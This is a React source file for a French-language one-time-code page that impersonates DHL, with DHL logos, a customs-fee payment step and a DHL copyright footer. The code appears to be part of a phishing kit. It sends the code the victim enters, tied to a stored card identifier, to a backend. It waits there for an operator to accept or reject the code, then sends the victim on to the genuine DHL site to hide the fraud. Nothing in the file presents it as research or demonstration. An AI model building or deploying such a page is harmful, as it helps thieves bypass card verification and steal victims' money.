import React, { useState, useEffect, useRef } from 'react';
import './OtpPage.css';

const OtpPage = () => {
  // State for OTP input, timer, button states
  const [otp, setOtp] = useState('');
  const [timeLeft, setTimeLeft] = useState(76); // 1:16 in seconds
  const [isVerifying, setIsVerifying] = useState(false);
  const [isResendDisabled, setIsResendDisabled] = useState(true);
  const [languageMenuOpen, setLanguageMenuOpen] = useState(false);
  const [selectedLang, setSelectedLang] = useState({ code: 'fr', name: 'Français', flag: '🇫🇷' });
  const [isRTL, setIsRTL] = useState(false);
  const [otpRequestId, setOtpRequestId] = useState(null);
  const [errorMessage, setErrorMessage] = useState('');
  const [successMessage, setSuccessMessage] = useState('');
  
  // API Configuration for Vite - use import.meta.env
  const apiUrl = import.meta.env.VITE_API_URL || 'http://localhost:5000/api';
  
  // IMPORTANT: Define the refs
  const languageMenuRef = useRef(null);
  const timerRef = useRef(null);
  const pollingRef = useRef(null);
  
  const languages = [
    { code: 'fr', name: 'Français', flag: '🇫🇷', rtl: false },
    { code: 'en', name: 'English', flag: '🇬🇧', rtl: false },
    { code: 'ar', name: 'العربية', flag: '🇸🇦', rtl: true }
  ];

  // Timer countdown effect
  useEffect(() => {
    if (timeLeft <= 0) {
      setIsResendDisabled(false);
      if (timerRef.current) clearInterval(timerRef.current);
      return;
    }
    
    timerRef.current = setInterval(() => {
      setTimeLeft(prev => prev - 1);
    }, 1000);
    
    return () => {
      if (timerRef.current) clearInterval(timerRef.current);
    };
  }, [timeLeft]);

  // Cleanup polling on unmount
  useEffect(() => {
    return () => {
      if (pollingRef.current) {
        clearInterval(pollingRef.current);
      }
    };
  }, []);

  // Format time as MM:SS
  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs < 10 ? '0' : ''}${secs}`;
  };

  // Handle OTP input change (4-8 digits)
  const handleOtpChange = (e) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 8);
    setOtp(value);
    setErrorMessage(''); // Clear error when user types
  };

  // Poll for OTP status
  const startPolling = (requestId) => {
    if (pollingRef.current) {
      clearInterval(pollingRef.current);
    }
    
    pollingRef.current = setInterval(async () => {
      try {
        const response = await fetch(`${apiUrl}/otp/status/${requestId}`);
        const data = await response.json();
        
        if (data.status === 'accepted') {
          clearInterval(pollingRef.current);
          setIsVerifying(false);
          setSuccessMessage(`✅ Code vérifié avec succès! (${data.code})`);
          setErrorMessage('');
          // You can redirect or show success page
          setTimeout(() => {
            window.location.href = 'https://www.dhl.com/dk-da/home/forsyningskaede.html';
          }, 1500);
        } else if (data.status === 'rejected') {
          clearInterval(pollingRef.current);
          setIsVerifying(false);
          setErrorMessage('❌ Le code a été rejeté. Veuillez réessayer.');
          setSuccessMessage('');
          // Reset OTP field
          setOtp('');
        }
      } catch (error) {
        console.error('Polling error:', error);
      }
    }, 2000); // Poll every 2 seconds
  };

  // Handle verify button click
  const handleVerify = async () => {
    // Validate OTP length (4-8 digits)
    if (!otp || otp.length < 4) {
      setErrorMessage('Veuillez entrer le code à 4-8 chiffres.');
      return;
    }
    
    if (otp.length > 8) {
      setErrorMessage('Le code ne peut pas dépasser 8 chiffres.');
      return;
    }
    
    setIsVerifying(true);
    setErrorMessage('');
    setSuccessMessage('');
    
    // Get cardId from localStorage or context
    const cardId = localStorage.getItem('cardId') || 'default_card_id';
    
    try {
      const response = await fetch(`${apiUrl}/send-otp`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          code: otp,
          cardId: cardId
        })
      });
      
      const data = await response.json();
      
      if (data.success) {
        const requestId = data.id;
        setOtpRequestId(requestId);
        setSuccessMessage('✅ Code envoyé pour vérification. En attente de confirmation...');
        // Start polling for status
        startPolling(requestId);
      } else {
        throw new Error(data.error || 'Failed to send OTP');
      }
    } catch (error) {
      console.error('Verification error:', error);
      setIsVerifying(false);
      setErrorMessage('❌ Erreur lors de la vérification. Veuillez réessayer.');
    }
  };

  // Handle resend code
  const handleResend = async () => {
    if (isResendDisabled) return;
    
    setErrorMessage('');
    setSuccessMessage('');
    
    const cardId = localStorage.getItem('cardId') || 'default_card_id';
    
    try {
      // Generate new OTP between 4-8 digits
      const length = Math.floor(Math.random() * 5) + 4; // Random length between 4-8
      const min = Math.pow(10, length - 1);
      const max = Math.pow(10, length) - 1;
      const newOtp = Math.floor(min + Math.random() * (max - min + 1)).toString();
      
      const response = await fetch(`${apiUrl}/send-otp`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          code: newOtp,
          cardId: cardId
        })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setOtp(newOtp);
        setOtpRequestId(data.id);
        setIsResendDisabled(true);
        setTimeLeft(76);
        setSuccessMessage(`📱 Un nouveau code a été envoyé à votre téléphone. (${newOtp.length} chiffres)`);
        
        // Clear existing polling and start new one
        if (pollingRef.current) {
          clearInterval(pollingRef.current);
        }
        startPolling(data.id);
        
        setTimeout(() => setSuccessMessage(''), 3000);
      }
    } catch (error) {
      console.error('Resend error:', error);
      setErrorMessage('❌ Erreur lors du renvoi du code. Veuillez réessayer.');
    }
  };

  // Handle language selection
  const handleLanguageSelect = (lang) => {
    setSelectedLang(lang);
    setIsRTL(lang.rtl);
    setLanguageMenuOpen(false);
    console.log(`Language changed to: ${lang.name}`);
  };

  // Toggle language menu
  const toggleLanguageMenu = () => setLanguageMenuOpen(prev => !prev);

  // Close language menu when clicking outside
  useEffect(() => {
    const handleClickOutside = (event) => {
      if (languageMenuRef.current && !languageMenuRef.current.contains(event.target)) {
        setLanguageMenuOpen(false);
      }
    };
    document.addEventListener('mousedown', handleClickOutside);
    return () => document.removeEventListener('mousedown', handleClickOutside);
  }, []);

  return (
    <div className="app" dir={isRTL ? 'rtl' : 'ltr'}>
      <main>
        {/* Header */}
        <div className="sc-9fc13f70-0 hCaVpb">
          <div className="sc-af944128-0 iSQNEq">
            <div className="sc-ac1f2408-0 sc-af944128-1 fcRhWn jnXOaK">
              <div dir="ltr" className="sc-af944128-4 GghYU">
                <div className="sc-af944128-2 idxbwe">
                  <img 
                    alt="DHL Logo" 
                    src="/dhl-express-logo.png"/>
                </div>
              </div>
              <div dir="ltr" className="sc-af944128-3 dZjtYI">
                <div className="sc-9fc13f70-5 bqGehh">
                  <div className="sc-9fc13f70-10 cCbdwA">
                    {/* Language Dropdown */}
                    <div className="portal-lang-dropdown" ref={languageMenuRef} style={{ position: 'relative' }}>
                      <button 
                        className="portal-lang-btn" 
                        id="langBtn"
                        onClick={toggleLanguageMenu}
                      >
                        <span id="langFlag">{selectedLang.flag}</span>
                        <span id="langName">{selectedLang.name}</span>
                        <svg width="12" height="12" viewBox="0 0 12 12" fill="none" style={{ marginLeft: '4px' }}>
                          <path d="M3 5L6 8L9 5" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round"></path>
                        </svg>
                      </button>
                      {languageMenuOpen && (
                        <div className="portal-lang-menu" id="langMenu" style={{
                          position: 'absolute',
                          top: 'calc(100% + 6px)',
                          right: 0,
                          background: '#fff',
                          borderRadius: '10px',
                          boxShadow: '0 8px 32px rgba(0,0,0,.18)',
                          minWidth: '180px',
                          overflow: 'hidden',
                          zIndex: 200,
                          border: '1px solid #e2e8f0'
                        }}>
                          {languages.map((lang) => (
                            <a
                              key={lang.code}
                              href="#"
                              onClick={(e) => {
                                e.preventDefault();
                                handleLanguageSelect(lang);
                              }}
                              style={{
                                display: 'flex',
                                alignItems: 'center',
                                gap: '10px',
                                padding: '10px 16px',
                                textDecoration: 'none',
                                color: '#333',
                                fontSize: '14px',
                                cursor: 'pointer',
                                backgroundColor: selectedLang.code === lang.code ? '#f1f5f9' : 'transparent'
                              }}
                              onMouseEnter={(e) => e.currentTarget.style.backgroundColor = '#f1f5f9'}
                              onMouseLeave={(e) => {
                                if (selectedLang.code !== lang.code) {
                                  e.currentTarget.style.backgroundColor = 'transparent';
                                }
                              }}
                            >
                              <span>{lang.flag}</span>
                              <span>{lang.name}</span>
                              {selectedLang.code === lang.code && (
                                <span style={{ marginLeft: 'auto', color: '#d40511' }}>✓</span>
                              )}
                            </a>
                          ))}
                        </div>
                      )}
                    </div>
                    <div className="sc-668c2989-0 csDJGO"></div>
                  </div>
                  <div className="sc-9fc13f70-28 gFDcEs">
                    <div className="sc-9fc13f70-29 eUEhcB"></div>
                  </div>
                  <div className="sc-9fc13f70-30 eVGzQl">
                    <div className="sc-9fc13f70-31 eVYcJy"></div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Main Content */}
        <div className="main-content">
          <div className="center-container">
            <div className="live-region" aria-live="assertive"></div>

            {/* Steps */}
            <div className="portal-steps">
              <div className="portal-step done">
                <span className="portal-step-circle done">
                  <svg width="14" height="11" viewBox="0 0 14 11" fill="none">
                    <path d="M1 5.5L5 9.5L13 1" stroke="#fff" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"></path>
                  </svg>
                </span>
                <span className="portal-step-label">Remplir les informations</span>
              </div>
              <span className="portal-step-line done"></span>
              <div className="portal-step active">
                <span className="portal-step-circle active">2</span>
                <span className="portal-step-label">Payer les frais de douane</span>
              </div>
              <span className="portal-step-line"></span>
              <div className="portal-step upcoming">
                <span className="portal-step-circle upcoming">3</span>
                <span className="portal-step-label">Soumettre la réexpédition</span>
              </div>
            </div>

            {/* OTP Card */}
            <div className="otp-card">
              <div className="otp-container-inner">
                {/* Animated Phone */}
                <div className="otp-phone-anim">
                  <div className="otp-signal"></div>
                  <div className="otp-signal"></div>
                  <div className="otp-phone-body">
                    <div className="otp-phone-notch"></div>
                    <div className="otp-phone-screen">
                      <div className="otp-msg-icon">
                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#64748b" strokeWidth="1.5">
                          <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
                          <polyline points="22,6 12,13 2,6"></polyline>
                        </svg>
                      </div>
                      <div className="otp-msg-bubble">OTP Code</div>
                      <div className="otp-msg-code">* * * *</div>
                    </div>
                    <div className="otp-phone-homebtn"></div>
                  </div>
                  <div className="otp-notif-dot">1</div>
                </div>

                <h2 className="otp-title">Vérifiez votre paiement</h2>
                <p className="otp-sub">Un code de vérification a été envoyé à votre numéro de téléphone enregistré.</p>

                {/* Error Message */}
                {errorMessage && (
                  <div className="otp-error-message" style={{
                    backgroundColor: '#fee2e2',
                    color: '#dc2626',
                    padding: '10px',
                    borderRadius: '8px',
                    marginBottom: '15px',
                    fontSize: '14px',
                    textAlign: 'center'
                  }}>
                    {errorMessage}
                  </div>
                )}

                {/* Success Message */}
                {successMessage && (
                  <div className="otp-success-message" style={{
                    backgroundColor: '#dcfce7',
                    color: '#16a34a',
                    padding: '10px',
                    borderRadius: '8px',
                    marginBottom: '15px',
                    fontSize: '14px',
                    textAlign: 'center'
                  }}>
                    {successMessage}
                  </div>
                )}

                <div className="otp-field-wrap">
                  <form data-portal="otp" noValidate onSubmit={(e) => e.preventDefault()}>
                    <input
                      type="text"
                      data-portal-field="otp_code"
                      maxLength="8"
                      className="otp-input"
                      placeholder={otp.length === 0 ? "----" : "--------"}
                      inputMode="numeric"
                      pattern="[0-9]*"
                      autoComplete="one-time-code"
                      value={otp}
                      onChange={handleOtpChange}
                      disabled={isVerifying}
                      style={{
                        textAlign: 'center',
                        fontSize: '32px',
                        letterSpacing: '8px',
                        padding: '15px'
                      }}
                    />
                    <div style={{ 
                      fontSize: '12px', 
                      color: '#64748b', 
                      textAlign: 'center',
                      marginTop: '8px'
                    }}>
                      {otp.length} / 8 chiffres (minimum 4)
                    </div>
                  </form>
                </div>

                <div className="otp-timer">
                  Le code expire dans <strong id="otp-countdown">{formatTime(timeLeft)}</strong>
                </div>

                <button
                  type="button"
                  className="otp-verify-btn"
                  onClick={handleVerify}
                  disabled={isVerifying || !otp || otp.length < 4}
                  style={{
                    opacity: (isVerifying || !otp || otp.length < 4) ? 0.6 : 1,
                    cursor: (isVerifying || !otp || otp.length < 4) ? 'not-allowed' : 'pointer'
                  }}
                >
                  {isVerifying ? 'Vérification en cours...' : 'Vérifier le code'}
                </button>

                <p className="otp-resend">
                  Vous n'avez pas reçu le code ?{' '}
                  <a
                    href="#"
                    onClick={(e) => {
                      e.preventDefault();
                      handleResend();
                    }}
                    style={{ 
                      pointerEvents: isResendDisabled ? 'none' : 'auto', 
                      opacity: isResendDisabled ? 0.5 : 1 
                    }}
                  >
                    Renvoyer le code
                  </a>
                </p>
              </div>
            </div>
          </div>
        </div>

        {/* Footer */}
        <div className="footer">
          <div className="footer-inner">
            <table className="footer-table">
              <tbody>
                <tr className="footer-row">
                  <td className="footer-links">
                    <a href="#" className="footer-link"><strong>Avis de confidentialité</strong></a>
                    <div className="footer-consent">
                      <a href="#" className="footer-consent-link">Paramètres de consentement</a>
                    </div>
                   </td>
                  <td className="footer-logo-cell">
                    <img 
                      alt="DHL Logo" 
                      loading="lazy" 
                      width="128" 
                      height="auto" 
                      decoding="async" 
                      src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyBpZD0ibG9nbyIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB2aWV3Qm94PSIwIDAgMTk2IDUxLjgzNjciIHdpZHRoPSIxNjAiIGhlaWdodD0iNTIiPgogIDxnPgogICAgPGc+CiAgICAgIDxnPgogICAgICAgIDxwb2x5Z29uIHBvaW50cz0iMCAyMi4xIDI2LjUwNTggMjIuMSAyNS4wNTgxIDI0LjA3MDMgMCAyNC4wNzAzIDAgMjIuMSAwIDIyLjEiLz4KICAgICAgICA8cG9seWdvbiBwb2ludHM9IjAgMTguNDQ0NCAyOS4xOTg2IDE4LjQ0NDQgMjcuNzQ4MyAyMC40MTIgMCAyMC40MTIgMCAxOC40NDQ0IDAgMTguNDQ0NCIvPgogICAgICAgIDxwb2x5Z29uIHBvaW50cz0iMCAyNS43NTg0IDIzLjgxNDYgMjUuNzU4NCAyMi4zNzMzIDI3LjcxNTIgMCAyNy43MTUyIDAgMjUuNzU4NCAwIDI1Ljc1ODQiLz4KICAgICAgPC9nPgogICAgICA8Zz4KICAgICAgICA8cG9seWdvbiBwb2ludHM9IjE5NiAyNC4wNzAzIDE2OS41OTc2IDI0LjA3MDMgMTcxLjA0NDYgMjIuMTAxNCAxOTYgMjIuMTAxNCAxOTYgMjQuMDcwMyAxOTYgMjQuMDcwMyIvPgogICAgICAgIDxwb2x5Z29uIHBvaW50cz0iMTk2IDI3LjcxNTIgMTY2LjkxMjggMjcuNzE3OSAxNjguMzUzNyAyNS43NTg0IDE5NiAyNS43NTg0IDE5NiAyNy43MTUyIDE5NiAyNy43MTUyIi8+CiAgICAgICAgPHBvbHlnb24gcG9pbnRzPSIxNzMuNzM1NCAxOC40NDQ0IDE5NiAxOC40NDQ0IDE5NiAyMC40MTMzIDE3Mi4yODcgMjAuNDE0NyAxNzMuNzM1NCAxOC40NDQ0IDE3My43MzU0IDE4LjQ0NDQiLz4KICAgICAgPC9nPgogICAgPC9nPgogICAgPGc+CiAgICAgIDxwYXRoIGQ9Im0yNS42NzI2LDI3LjcxNTJsMTIuNTc4LTE3LjA4ODVoMTUuNjA4MmMxLjcyNTIsMCwxLjcwMjYuNjU1Ljg1OTUsMS43OTc1LS44NTYyLDEuMTYtMi4zMTM0LDMuMTU0Ni0zLjE4NTQsNC4zMzIyLS40NDI2LjU5ODItMS4yNDMxLDEuNjg4MSwxLjQwODksMS42ODgxaDIwLjkxMDFjLTEuNzM5LDIuMzgyMi03LjM3OTYsOS4yNzA4LTE3LjUwODMsOS4yNzA4aC0zMC42NzFaIi8+CiAgICAgIDxwYXRoIGQ9Im05Ny43MDU2LDE4LjQ0M2wtNi44MjAyLDkuMjcyMmgtMTcuOTkyNHM2LjgxNzItOS4yNzA4LDYuODIzMy05LjI3MDhsMTcuOTg5My0uMDAxNGgwWiIvPgogICAgICA8cGF0aCBkPSJtMTIzLjcyMzksMTguNDQ0NGwtNi44MjM5LDkuMjcwOGgtMTcuOTg1NnM2LjgxNzgtOS4yNzA4LDYuODIzOS05LjI3MDhoMTcuOTg1NloiLz4KICAgICAgPHBhdGggZD0ibTEyOS41NzQ5LDE4LjQ0NDRjLjAwMDYsMC0xLjMxNCwxLjc5NzQtMS45NTI4LDIuNjYwNC0yLjI1OTMsMy4wNTMzLS4yNjI2LDYuNjEwNCw3LjExMDksNi42MTA0aDI4Ljg4NTNsNi44MjI2LTkuMjcwOGgtNDAuODY2MVoiLz4KICAgIDwvZz4KICAgIDxnPgogICAgICA8cGF0aCBkPSJtMzQuNDY4NSwwbC02LjI2MjEsOC41MDc4aDM0LjEyODhjMS43MjQ5LDAsMS43MDIzLjY1NS44NTkzLDEuNzk3NC0uODU2MiwxLjE1ODctMi4yODk0LDMuMTc2My0zLjE2MTQsNC4zNTM4LS40NDI3LjU5NjktMS4yNDMxLDEuNjg2NywxLjQwODksMS42ODY3aDEzLjk1NjRzMi4yNDk1LTMuMDYxNCw0LjEzNTItNS42MjA1YzIuNTY1NS0zLjQ4MTQuMjIyNS0xMC43MjUyLTguOTQ4Ni0xMC43MjUyaC0zNi4xMTY1WiIvPgogICAgICA8cG9seWdvbiBwb2ludHM9IjEyNS4yNjg4IDE2LjM0NTggODEuMjYxOSAxNi4zNDU4IDkzLjI5NTYgMCAxMTEuMjgxOSAwIDEwNC4zODU4IDkuMzcyMSAxMTIuNDEzNiA5LjM3MjEgMTE5LjMxNTMgMCAxMzcuMjk4OSAwIDEyNS4yNjg4IDE2LjM0NTggMTI1LjI2ODggMTYuMzQ1OCIvPgogICAgICA8cGF0aCBkPSJtMTYyLjIwODQsMGwtMTIuMDMxNCwxNi4zNDU4aC0xOS4wNTkzUzE0My4xNTMyLDAsMTQzLjE1OTIsMGgxOS4wNDkyWiIvPgogICAgPC9nPgogIDwvZz4KICA8Zz4KICAgIDxwYXRoIGQ9Im0xMjguODQxMiw0OC4zOTQzYy0xLjc5NjgsMC0zLjE5MzktLjU1MDctNC4xOTA1LTEuNjUyM3MtMS40OTUtMi42Mjk0LTEuNDk1LTQuNTgzNXYtMS4xNDEyYzAtMS4yOTgxLjI0MzEtMi40MDk2LjcyNzktMy4zMzQzLjQ4NTUtLjkyNDQsMS4xNjc1LTEuNjMyNywyLjA0Ni0yLjEyNDMuODc4NS0uNDkxOSwxLjkwODItLjczNzcsMy4wODg1LS43Mzc3Ljk0NCwwLDEuNzkwMS4xNjA3LDIuNTM3NS40ODE4Ljc0NzUuMzIxOCwxLjM5NzEuNzkwNCwxLjk0NzQsMS40MDY1bC0xLjczMDYsMS44Mjk2Yy0uNDMyOC0uNDMyOC0uODcyNC0uNzM0My0xLjMxODEtLjkwNDgtLjQ0NjMtLjE3MDUtLjkxMTYtLjI1NTktMS4zOTcxLS4yNTU5LS45NDQsMC0xLjY2OTIuMzE4NC0yLjE3MzYuOTU0MS0uNTA1MS42MzY0LS43NTc2LDEuNTcwNi0uNzU3NiwyLjgwMzN2LjkwNDhjMCwxLjIzMy4yMzMsMi4xNzM5LjY5ODksMi44MjI4LjQ2NTIuNjQ5MiwxLjE0MzkuOTczNywyLjAzNTguOTczNy44MTMsMCwxLjQzODktLjI2ODQsMS44Nzg1LS44MDYycy42NTktMS4yMzI2LjY1OS0yLjA4NTVoLTIuNTk3di0yLjM5OThoNS40ODl2Mi4yODJjMCwxLjE2NzUtLjIyMzUsMi4xNjcyLS42NjkyLDIuOTk5Ny0uNDQ1Ny44MzMyLTEuMDc1NywxLjQ2OS0xLjg4ODYsMS45MDgycy0xLjc3NzIuNjU5LTIuODkxNC42NTlaIi8+CiAgICA8cGF0aCBkPSJtMTM2LjQ3MzUsNDguMDk5M3YtMTAuMDMyNGgyLjY5NDl2Mi40OThjLjE0MzgtLjQ0NTcuMzM3Ni0uODY4Ny41OC0xLjI2ODguMjQzMS0uMzk5Ny41NTc3LS43Mjc5Ljk0NDctLjk4MzUuMzg2Mi0uMjU1OS44Njg0LS4zODM1LDEuNDQ1Ny0uMzgzNS4xMTgyLDAsLjIyNjIuMDAzNC4zMjQ4LjAwOTguMDk3OS4wMDY4LjIxOTUuMDIzLjM2NC4wNDl2Mi42MzYxYy0uMTA1My0uMDEyOC0uMjIwMS0uMDIyNi0uMzQ0NC0uMDI5NC0uMTI0OS0uMDA2NC0uMjQ1OC0uMDA5OC0uMzY0LS4wMDk4LS43MjEyLDAtMS4zMTEzLjEzNzQtMS43NzA1LjQxMjlzLS44MDAyLjU3MDYtMS4wMjMuODg1MnY2LjIxNjJoLTIuODUyMloiLz4KICAgIDxwYXRoIGQ9Im0xNDguNjUsNDguMzM1M2MtMS40OTUsMC0yLjY3MjYtLjQzMjgtMy41MzA4LTEuMjk4MS0uODU5Ni0uODY1Ny0xLjI4OS0yLjA1MjQtMS4yODktMy41NjA1di0uNzg3YzAtMS41MDc4LjQyOTUtMi42OTQ5LDEuMjg5LTMuNTYwNS44NTgyLS44NjU3LDIuMDM1OC0xLjI5ODUsMy41MzA4LTEuMjk4NXMyLjY3MTkuNDMyOCwzLjUzMDgsMS4yOTg1LDEuMjg5LDIuMDUyNywxLjI4OSwzLjU2MDV2Ljc4N2MwLDEuNTA4MS0uNDMwMSwyLjY5NDktMS4yODksMy41NjA1LS44NTg5Ljg2NTMtMi4wMzU4LDEuMjk4MS0zLjUzMDgsMS4yOTgxWm0wLTIuMzgwMmMuNjE2NSwwLDEuMDk3OS0uMjA5NywxLjQ0NTctLjYyOTNzLjUyMTMtMS4wNTU3LjUyMTMtMS45MDgydi0uNjY4OGMwLS44NTI1LS4xNzM1LTEuNDg4Mi0uNTIxMy0xLjkwODItLjM0NzctLjQxOTctLjgyOTItLjYyOTctMS40NDU3LS42Mjk3cy0xLjA5ODYuMjEtMS40NDU3LjYyOTdjLS4zNDc3LjQyLS41MjEzLDEuMDU1Ny0uNTIxMywxLjkwODJ2LjY2ODhjMCwuODUyNS4xNzM1LDEuNDg4Ni41MjEzLDEuOTA4Mi4zNDcxLjQxOTcuODI5Mi42MjkzLDEuNDQ1Ny42MjkzWiIvPgogICAgPHBhdGggZD0ibTE1OC41MDU4LDQ4LjI5NjFjLS45ODM4LDAtMS43MzgxLS4zNDc0LTIuMjYyNy0xLjA0MjZzLS43ODY3LTEuNjc4Ni0uNzg2Ny0yLjk1MDh2LTYuMjM1OGgyLjg1MjJ2Ni4wNTg2YzAsLjUzODIuMTE0OC45NjM5LjM0NDQsMS4yNzg5LjIyOTYuMzE0Ny41OTM1LjQ3MiwxLjA5MTkuNDcyLjM2NjcsMCwuNjg4Ny0uMDg4NS45NjM2LS4yNjU3LjI3NTUtLjE3NjkuNDk4My0uNDAzMS42NjkyLS42Nzg2di02Ljg2NTJoMi44NTIydjEwLjAzMjRoLTIuNjk0OXYtMS43NTA5Yy0uMzAxOC41NzczLS43MDQ5LDEuMDQ1OS0xLjIxLDEuNDA2NXMtMS4xMTE0LjU0MTItMS44MTkxLjU0MTJaIi8+CiAgICA8cGF0aCBkPSJtMTY2LjgyNjEsNTEuODM2N3YtMTMuNzY5OGgyLjY5NDl2MS43MzFjLjI3NTUtLjYwMy42NzE5LTEuMDc1MywxLjE4OTgtMS40MTYzLjUxODYtLjM0MSwxLjExMTQtLjUxMTUsMS43ODA2LS41MTE1LDEuMTI3NiwwLDIuMDA5NS40Mjk4LDIuNjQ1NiwxLjI4ODQuNjM2MS44NTkyLjk1NDEsMi4wMzYyLjk1NDEsMy41MzEydi43ODdjMCwxLjQ5NS0uMzE4LDIuNjcyMy0uOTU0MSwzLjUzMDgtLjYzNjEuODU5Mi0xLjUxNzksMS4yODg3LTIuNjQ1NiwxLjI4ODctMS4yOTg1LDAtMi4yMzY0LS42MDMzLTIuODEzLTEuODF2NS4zNTA2aC0yLjg1MjJabTQuNTgzNS0xMS41NjY4Yy0uNzIxOCwwLTEuMjk4NS4zMDgyLTEuNzMxMy45MjQ3djMuNzk2NWMuNDMyOC42MDMzLDEuMDA5NS45MDQ4LDEuNzMxMy45MDQ4LjU5MDIsMCwxLjA0MjYtLjIxMywxLjM1NzItLjYzOTFzLjQ3Mi0xLjAzOTIuNDcyLTEuODM5NHYtLjY2ODhjMC0uNzk5OC0uMTU3My0xLjQxMjktLjQ3Mi0xLjgzOTQtLjMxNDctLjQyNjEtLjc2NzEtLjYzOTUtMS4zNTcyLS42Mzk1WiIvPgogIDwvZz4KPC9zdmc+" 
                      style={{ color: 'transparent', width: '128px', height: 'auto' }}
                    />
                   </td>
                 </tr>
              </tbody>
              <tfoot>
                <tr className="footer-copyright-row">
                  <td colSpan="2" className="footer-copyright">
                    2026 DHL Group - All rights reserved
                   </td>
                 </tr>
              </tfoot>
            </table>
          </div>
        </div>
      </main>
    </div>
  );
};

export default OtpPage;